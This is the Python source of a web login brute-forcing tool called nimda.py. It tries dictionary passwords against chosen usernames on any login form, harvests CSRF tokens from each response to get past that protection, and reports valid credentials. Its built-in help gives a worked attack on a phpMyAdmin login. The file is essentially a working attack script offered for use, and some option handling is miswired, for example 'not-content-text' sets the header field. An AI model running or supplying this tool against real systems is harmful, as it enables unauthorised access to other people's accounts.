import operator
import requests
import time
import sys
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

try:
    from pyquery import PyQuery
except ImportError:
    raise ImportError('%sYou need to install pyquery library. Run: sudo pip install pyquery%s' %(bcolors.FAIL, bcolors.ENDC))

def mylogo():
    print """{}
 mm   m mmmmm  m    m mmmm     mm
 #"m  #   #    ##  ## #   "m   ##
 # #m #   #    # ## # #    #  #  #
 #  # #   #    # "" # #    #  #mm#
 #   ## mm#mm  #    # #mmm"  #    #

    {}""".format(bcolors.WARNING, bcolors.ENDC)





class Brute:
    """docstring for Brute."""
    def __init__(self):
        self.verbose = False
        self.debugging = False
        self.breakFirstMatch = False
        self.postJson = dict()
        self.incorrectCredentialsResLen = 0
        self.correctCredentials = []
        self.startTime = time.time()
        self.csrfEnabled = False
        self.progresBar = False
        self.responseHtml = False
        self.responseHeader = False
        self.csrfSelector = ''
        self.contentText = ''
        self.notContentText = ''
        self.contentHeader = ''
        self.notContentHeader = ''
        self.setCookie = ''
        self.statusCode = 0
        self.formName = dict()

    def setUrl(self, url):
        self.url = url
        return self

    def setCsrf(self, csrf):
        self.formName.update({'csrf':csrf})
        self.csrfEnabled = True
        return self

    def setUsernames(self, usernames):
        """
            userlogin=admin,nimda,nick,george
            userlogin is form name for username and
            admin,nimda,nick,george are usernames to try
        """

        self.formName.update({'username':usernames.split('=')[0]})
        self.usernames = usernames.split('=')[1].split(',')
        return self

    def setPasswords(self, passwdTxt):
        """
            usrpasswd=passwd.txt
            usrpasswd is form field name for passwords
            and passwd.txt is dictionary file name provided by user
        """

        self.formName.update({'password':passwdTxt.split('=')[0]})
        self.passwordsTxt = passwdTxt.split('=')[1]
        return self

    def setPostData(self, pData):
        """ ppdata is without usernames and passwords """
        pdt = pData.split('&')
        for x in range(0, len(pdt)):
            currel = pdt[x].split('=')
            self.postJson.update({currel[0]:currel[1]})
        # print self.postJson

    def sendEmptyPostRequest(self):
        tmpJson = self.postJson
        tmpJson.update({self.formName['username']:'00000000'})
        tmpJson.update({self.formName['password']:'00000000'})

        if self.csrfEnabled == True:
            self.postJson.update({self.formName['csrf']:''})

        # self.postJson.update({"ninja":"bliaz"})
        # print tmpJson
        return requests.post(self.url, data = tmpJson,verify=True)


    def getCsrfToken(self, response, selector):
        # find in response HTML and return it
        pq = PyQuery(response.text)
        # tag = pq('input[name="token"]')
        tag = pq(selector)
        return tag


    def startProccessing(self):
        #incorrect login response length assigned
        firstResp = self.sendEmptyPostRequest()
        # print firstResp.headers['Content-Length']
         

        print "Trying combination of usernames {} with provided passwords from {} file".format(self.usernames, self.passwordsTxt)
        print "Brute-forcing %s" % (self.url)

        progressDash = ''
        csrf_token = self.getCsrfToken(firstResp, self.csrfSelector).val()
        myCounter = 0
        sizeOfDict = sum(1 for line in open(self.passwordsTxt))
        for usrnms in self.usernames:
            with open(self.passwordsTxt) as _dict:
                for passwd in _dict:
                    # session = requests.Session()
                    myCounter+=1
                    # remove previous username adn passwords and csrf
                    if self.csrfEnabled == True:
                        del self.postJson[self.formName['csrf']]

                    del self.postJson[self.formName['username']]
                    del self.postJson[self.formName['password']]

                    #update formdata with new values of username and password
                    if self.csrfEnabled == True:
                        self.postJson.update({self.formName['csrf'] : csrf_token})

                    #update formdata with new values of username and password
                    self.postJson.update({self.formName['username'] : usrnms})

                    # remove \n endlines from txt file
                    self.postJson.update({self.formName['password'] : passwd.rstrip()})

                    if self.debugging == True:
                        print self.postJson




                    # req = requests.post(self.url, data = self.postJson)

                    try:
                        # r = requests.get(url,timeout=3)
                        # r.raise_for_status()
                        # req = requests.post(self.url, data = self.postJson)
                        # session = requests.Session()
                        # print firstResp.cookies['wordpress_test_cookie']
                        # print self.setCookie
                        # print firstResp.cookies
                        req = requests.post(self.url, data = self.postJson, cookies=firstResp.cookies, verify=True)
                        firstResp = req
                    except requests.exceptions.HTTPError as errh:
                        print ("Http Error:",errh)
                    except requests.exceptions.ConnectionError as errc:
                        print ("Error Connecting:",errc)
                    except requests.exceptions.Timeout as errt:
                        print ("Timeout Error:",errt)
                    except requests.exceptions.RequestException as err:
                        print ("OOps: Something Else",err)



                    if self.csrfEnabled == True:
                        csrf_token = self.getCsrfToken(req, self.csrfSelector).val()


                    if self.verbose != True:
                        os.system('clear')
                        mySpinner = '\ '
                        if myCounter % 4 == 0:
                            mySpinner = '\ '
                        elif myCounter % 4 == 1:
                            mySpinner = '| '
                        elif myCounter % 4 == 2:
                            mySpinner = '/ '
                        else:
                            mySpinner = '- '
                   
                    if self.verbose != True:
                        for cr in self.correctCredentials:
                            print cr
                    
                    if len(progressDash) > 10000:
                        progressDash = ''

                    if self.verbose != True:
                        print "Brute-forcing: {}".format(self.url)
                        print "{} : {}".format(usrnms, passwd.rstrip())
                        print "{} out of {}".format(myCounter, sizeOfDict)
                        if self.progresBar == True:
                            print "{}".format(progressDash)
                        print "{} {} seconds elapsed".format(mySpinner, time.time() - self.startTime)
                    if (int(self.statusCode) == int(req.status_code)) or ((self.contentText != '' and self.contentText in req.text) or (self.notContentText != '' and self.notContentText not in req.text)) or ((self.contentHeader != '' and self.contentHeader in req.text) or (self.notContentHeader != '' and self.notContentHeader not in req.text)):
                        progressDash += bcolors.OKGREEN +'*_*'+bcolors.ENDC
                        print "{}Correct combination! username: {}, password: {}; status-code  : {}{}".format(
                            bcolors.OKGREEN,
                            usrnms,
                            passwd.rstrip(),
                            # headContLen,
                            req.status_code,
                            bcolors.ENDC)
                        self.correctCredentials.append("{}Correct Combination! username: {}, password: {}{}".format(
                            bcolors.OKGREEN,
                            usrnms,
                            passwd.rstrip(),
                            bcolors.ENDC))
                    else:
                        progressDash += bcolors.FAIL +'.'+bcolors.ENDC
                        if self.verbose == True:
                            print "{}WRONG! {} : {}, stat: {}, head-len:{}, content-len: {}, data: {} {}".format(
                            bcolors.FAIL,
                            usrnms,
                            passwd.rstrip(),
                            req.status_code,
                            len(req.headers),
                            len(req.text),
                            self.postJson,
                            bcolors.ENDC)
                    if self.responseHtml == True:
                        print "{}response-HTML:\n {}{}".format(bcolors.BOLD,req.text.encode('utf-8'),bcolors.ENDC)
                    if self.responseHeader == True:
                        print "{}response-header:{}, \n content:\n {}".format(bcolors.BOLD,req.headers,bcolors.ENDC)

                    if myCounter > sizeOfDict:
                        myCounter = 0


        if self.verbose == True:
            mylogo()


        print "Done in {} seconds".format(time.time() - self.startTime)
        for cr in self.correctCredentials:
            print cr
        if len(self.correctCredentials) == 0:
            print '%s Sorry we couldn\'t find any match %s' % (bcolors.FAIL, bcolors.ENDC)

if __name__ == "__main__":
    # --csrf-token-name=csrftok
    # --username=admin,root
    # --password=small.txt
    mylogo()
    execProgram = True
    displayHelp = False
    b = Brute()
    items = sys.argv
    if len(items) <= 1:
        execProgram = False
    for x in range(1,len(items)):
        usrkey = items[x].split('=', 1)

        if usrkey[0] == 'h' or usrkey[0] == 'help' or usrkey[0] == '-h' or usrkey[0] == '--help':
            print """
Please see my github page: https://bichiko.github.io/nimda.py/

# nimda.py
**NIMDA.py is a Bruteforcing tool for any login page.
You just need to provide necessary details and then it is ready to go.**

## Parameters:

- *url* 
- *username* 
- *password* 
- *post-data* 
- *csrf-selector* 
- *csrf-token-name* 
- *content-text* 
- *not-content-text* 
- *content-header* 
- *not-content-header* 
- *first-match* 
- *show-response-html* 
- *show-response-header* 
- *progress-bar* 
- *verbose* 


## Explanation

**help** -> Display help

**url** -> Set target url for submission post request
example: `python nimda.py url='http://exmpl.cm/lg.php'` 

**username** -> Set username details with HTML form name and its value
example: `<input type="text" value="site_admin" name="pg_user">`

then: `python nimda.py username='pg_user=site_admin'`

**password** -> Set dictionary file
example: `<input type="password" value="" name="pg_passwd">`

Dict file: `./lsts/passwords.lst`

then: `python nimda.py password='pg_passwd=./lsts/passwords.lst'`


Some login forms are protected with some CSRF TOKENS.
Web page generates token injects in login page and excepts this value for next login request.
If it isn't there or is incorrect value then server blocks our requests.
But we can bypass it by specifying csrf-token-name and csrf-selector
example: <input type="hidden" value="GFHKJ4576jhasldL:IUGBVCRTU" name="cstf_hid_token">`
then: `csrf-token-name='cstf_hid_token'`
And `csrf-selector` is `document.querySelector` syntax in order to find this value inside response HTML and send it back.

then: `csrf-selector='input[name="cstf_hid_token"]'
so result looks like:
```
python nimda.py url='http://exmpl.cm/lg.php' username='pg_user=site_admin' password='pg_passwd=./lsts/passwords.lst' csrf-token-name='cstf_hid_token' csrf-selector='input[name="cstf_hid_token"]'
```


**post-data** -> it is all post data parameters+value except csrf-token username and password
example: 
```
<input type="submit" name="login" value="Sign In">
<input type="hidden" name="error" value="0">
```
then: `data='login=Sign In&error=0'`


**content-text** -> Set unique text that contains only if page has successful authentication response
Like: **Welcome**, **Successful login** and etc.


**not-content-text** -> Set unique text that contains unsuccessful authentication response and isn't display in success response
Like: **Wrong**, **Incorrect login** and etc.

**content-header** and **not-content-header** are working likwise

**progress-bar** -> Display progress

**verbose** -> display more text

**first-match** -> Stop when program finds first match combination 


# Example of brute-forcing *phpmyadmin*

HTML form: 
```
 <form method="post" action="index.php" name="login_form" class="disableAjax login hide js-show">
    <fieldset>
        <legend>Log in<a href="./doc/html/index.html" target="documentation"><img src="themes/dot.gif" title="Documentation" alt="Documentation" class="icon ic_b_help" /></a>
        </legend>
        <div class="item">
            <label for="input_username">Username:</label>
            <input type="text" name="pma_username" id="input_username" value="" size="24" class="textfield"/>
        </div>
        <div class="item">
            <label for="input_password">Password:</label>
            <input type="password" name="pma_password" id="input_password" value="" size="24" class="textfield" />
        </div>
        <input type="hidden" name="server" value="1" />
    </fieldset>
    <fieldset class="tblFooters">
        <input value="Go" type="submit" id="input_go" />
        <input type="hidden" name="target" value="index.php" />
        <input type="hidden" name="token" value="4d604030d09328d67c268585d47134b9" />
    </fieldset>
    </form>
```

Post data:
```
pma_username=root&pma_password=blahblah&server=1&target=index.php&token=4d604030d09328d67c268585d47134b9
```
*token* is CSRF protection 

Displays Error : `Access denied for user` which is only if authentication fails

Our Code for Brute-forcing is:

```
python nimda.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,nimda,ttu' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' not-content-text='Access denied for user'
```
<img src="./img/1.png">


```
python nimda.py url='http://localhost/phpmyadmin/index.php' username='pma_username=root,admin,ttu,nimda' password='pma_password=./small.txt' csrf-token-name='token' csrf-selector='input[name="token"]' post-data='server=1&target=index.php' content-text='information_schema' progress-bar
```
<img src="./img/2.png">

            """
            execProgram = False
            break

        if usrkey[0] == 'csrf-token-name':
            b.setCsrf(usrkey[1])
        if usrkey[0] == 'username':
            b.setUsernames(usrkey[1])
        if usrkey[0] == 'url':
            b.setUrl(usrkey[1])
        if usrkey[0] == 'password':
            b.setPasswords(usrkey[1])
        if usrkey[0] == 'post-data':
            b.setPostData(usrkey[1])
        if usrkey[0] == 'verbose':
            b.verbose = True
        if usrkey[0] == 'debugging':
            b.debugging = True
        if usrkey[0] == 'first-match':
            b.breakFirstMatch = True
        if usrkey[0] == 'csrf-selector':
            b.csrfSelector = usrkey[1]
        if usrkey[0] == 'content-text':
            b.contentText = usrkey[1]
        if usrkey[0] == 'not-content-header':
            b.notContentHeader = usrkey[1]
        if usrkey[0] == 'content-header':
            b.contentText = usrkey[1]
        if usrkey[0] == 'not-content-text':
            b.notContentHeader = usrkey[1]
        if usrkey[0] == 'progress-bar':
            b.progresBar = True
        if usrkey[0] == 'show-response-html':
            b.responseHtml = True
        if usrkey[0] == 'show-response-header':
            b.responseHeader = True
        if usrkey[0] == 'status-code':
            b.statusCode = usrkey[1]
        # if usrkey[0] == 'cookie':
            # b.setCookie = 'wordpress_test_cookie=WP+Cookie+check'


    if execProgram == True:
        # exec
        b.startProccessing()



# python b.py username='username=nimda' url='http://localhost/training_platform/index.php?controller=Users&action=signin' password='password=small.txt' post-data='signin=Sign In' verbose debugging first-match

